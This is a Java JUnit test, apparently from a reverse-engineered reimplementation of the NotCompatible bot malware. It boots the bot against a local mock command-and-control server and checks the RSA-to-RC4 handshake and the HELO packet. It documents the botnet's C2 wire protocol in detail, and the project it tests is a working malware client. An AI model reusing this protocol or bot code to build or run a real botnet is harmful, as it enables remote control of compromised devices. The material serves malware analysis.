package diff.notcompatible.c.bot;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.SecureRandom;
import java.security.Security;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;

import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.Timeout;
import org.junit.jupiter.api.io.TempDir;

import diff.notcompatible.c.bot.crypto.RC4;
import diff.notcompatible.c.bot.crypto.RSA;
import diff.notcompatible.c.bot.net.ThreadServer;
import diff.notcompatible.c.bot.objects.Config;
import diff.notcompatible.c.bot.objects.MyBuffer;
import diff.notcompatible.c.bot.objects.Packet;

/**
 * End-to-end smoke test: boots the bot (ThreadServer) exactly as {@code driver.main} does, but
 * pointed at a small hand-rolled "mock controller" instead of the real C&C, and walks it through
 * the real wire protocol (RSA key exchange -> RC4 session -> HELO) using nothing but the
 * project's own Packet/MyBuffer/RC4/RSA classes.
 *
 * This does not re-implement a real C&C server. It is just enough of one to prove the bot's
 * TCP client half (Link.java) behaves as reversed: connects out, sends its RSA public key,
 * accepts an RSA-wrapped RC4 key back, and then speaks the Packet protocol in the clear once
 * decrypted.
 *
 * ThreadServer.run() loops forever (there is no shutdown path in the original malware), so this
 * runs the bot on a daemon thread and never joins it - the test JVM worker reclaims it on exit.
 */
class MockControllerIntegrationTest {

    static {
        Security.addProvider(new BouncyCastleProvider());
    }

    @Test
    @Timeout(value = 30, unit = TimeUnit.SECONDS)
    void botConnectsToMockControllerAndSendsHello(@TempDir File sessionDirectory) throws Exception {
        byte[] uuid = new byte[16];
        new SecureRandom().nextBytes(uuid);

        try (ServerSocket mockController = new ServerSocket(0);
                        ServerSocket portFinder = new ServerSocket(0)) {
            int mockControllerPort = mockController.getLocalPort();
            int botP2PPort = portFinder.getLocalPort();
            portFinder.close();

            // Build a "data.bin" that points the bot's SET/DATA/GROUP(0)/SERV at our mock
            // controller instead of resources/default.config's real C&C, using the project's own
            // Config/Packet classes so the on-disk format is exactly what the real bot produces.
            writeConfigPointingAt(sessionDirectory, "127.0.0.1", mockControllerPort, botP2PPort, uuid);

            ThreadServer bot = new ThreadServer(new Object());
            bot.init(sessionDirectory, null, null, null);
            Thread botThread = new Thread(bot, "bot-under-test");
            botThread.setDaemon(true);
            botThread.start();

            mockController.setSoTimeout(25_000);
            try (Socket client = mockController.accept()) {
                client.setSoTimeout(25_000);
                InputStream in = client.getInputStream();
                OutputStream out = client.getOutputStream();

                // 1) Bot sends its freshly generated RSA public key modulus as dword-length +
                // raw bytes (Link.onConnect).
                byte[] modulus = readFramed(in);
                RSA botPublicKey = new RSA();
                assertTrue(botPublicKey.loadPublic(modulus), "controller could not parse the bot's RSA public key");

                // 2) We pick an RC4 session key, RSA-encrypt it (padded with one leading marker
                // byte, matching how Link.onRead strips index 0 after decrypting), and send it
                // back the same way (Link.onRead's "no encryption set up yet" branch).
                byte[] rc4Key = new byte[100];
                new SecureRandom().nextBytes(rc4Key);
                byte[] rsaPlaintext = new byte[101];
                // Index 0 must be non-zero: RSA's unsigned-magnitude encoding strips a leading
                // zero byte, which would make the decrypted array only 100 bytes long and trip
                // the arraycopy(decrypted, 1, rc4key, 0, 100) in Link.onRead. The real client
                // does the same thing for the equivalent UDP exchange (UDPPoint.recvPublic sets
                // tmpRC4Data[0] = 0x7).
                rsaPlaintext[0] = 0x7;
                System.arraycopy(rc4Key, 0, rsaPlaintext, 1, rc4Key.length);
                byte[] encryptedRc4Key = botPublicKey.encrypt(rsaPlaintext);
                assertNotNull(encryptedRc4Key, "RSA encryption of the session key failed");
                writeFramed(out, encryptedRc4Key);

                // 3) From here on the link is RC4-encrypted in both directions with the same key,
                // one independent RC4 keystream per direction - exactly as Link.java sets up
                // rc4Instream/rc4Outstream.
                RC4 fromBot = new RC4(rc4Key);

                // 4) The bot immediately sends HELO once encryption is up (Link.onRead ->
                // sendHello()). Read and decrypt until we can unpack it.
                Packet helo = receivePacket(in, fromBot, "HELO");

                assertEquals("HELO", helo.tag);
                assertNotNull(helo.getByName("VER"), "HELO missing VER");
                assertEquals(2, helo.getByName("VER").asDWord(), "unexpected protocol version");
                assertNotNull(helo.getByName("UUID"), "HELO missing UUID");
                assertArrayEquals(uuid, helo.getByName("UUID").array(), "bot reported a different UUID than its config");
                assertNotNull(helo.getByName("GROUP"), "HELO missing GROUP");
                assertNotNull(helo.getByName("LID"), "HELO missing LID");
                assertEquals(1L, helo.getByName("LID").asInt64(), "bot reported a different config version (LID)");
                assertNotNull(helo.getByName("CT"), "HELO missing CT (connection type)");
            }
        }
    }

    /** Builds and saves a data.bin identical in shape to resources/default.config, but pointing group 0's server at our mock controller. */
    private static void writeConfigPointingAt(File sessionDirectory, String ip, int port, int botP2PPort, byte[] uuid) {
        Packet root = new Packet();
        root.tag = "SET";

        Packet data = root.add();
        data.tag = "DATA";

        Packet lid = data.add();
        lid.tag = "LID";
        lid.buffer.putInt64(1);

        Packet group = data.add();
        group.tag = "GROUP";

        Packet groupId = group.add();
        groupId.tag = "ID";
        groupId.buffer.putWord(0);

        Packet serv = group.add();
        serv.tag = "SERV";

        Packet servIp = serv.add();
        servIp.tag = "IP";
        servIp.buffer.putIP(ip);

        Packet servPort = serv.add();
        servPort.tag = "PORT";
        servPort.buffer.putPort(port);

        Packet uuidPacket = root.add();
        uuidPacket.tag = "UUID";
        uuidPacket.buffer.put(uuid);

        Packet rootGroup = root.add();
        rootGroup.tag = "GROUP";
        rootGroup.buffer.putWord(0);

        Packet rootPort = root.add();
        rootPort.tag = "PORT";
        rootPort.buffer.putWord(botP2PPort);

        Config config = new Config(sessionDirectory);
        config.packet = root;
        config.save(sessionDirectory);
    }

    private static byte[] readFramed(InputStream in) throws IOException {
        byte[] lengthBytes = in.readNBytes(4);
        assertEquals(4, lengthBytes.length, "connection closed while reading a length prefix");
        MyBuffer lengthBuffer = new MyBuffer();
        lengthBuffer.put(lengthBytes);
        int length = lengthBuffer.asDWord();
        byte[] payload = in.readNBytes(length);
        assertEquals(length, payload.length, "connection closed mid-payload");
        return payload;
    }

    private static void writeFramed(OutputStream out, byte[] payload) throws IOException {
        MyBuffer lengthBuffer = new MyBuffer();
        lengthBuffer.putDword(payload.length);
        out.write(lengthBuffer.array());
        out.write(payload);
        out.flush();
    }

    /** Reads raw bytes off the socket, RC4-decrypts them, and feeds them to Packet.unpack until a packet with the given tag shows up - mirroring Link.parseCommand()'s loop. */
    private static Packet receivePacket(InputStream in, RC4 rc4, String expectedTag) throws IOException {
        MyBuffer accumulated = new MyBuffer();
        byte[] chunk = new byte[4096];
        int read;
        while ((read = in.read(chunk)) >= 0) {
            if (read > 0) {
                accumulated.put(rc4.crypt(Arrays.copyOf(chunk, read)));
                Packet packet;
                while ((packet = Packet.unpack(accumulated)) != null) {
                    if (expectedTag.equals(packet.tag)) {
                        return packet;
                    }
                }
            }
        }
        throw new IOException("connection closed before a [" + expectedTag + "] packet arrived");
    }
}
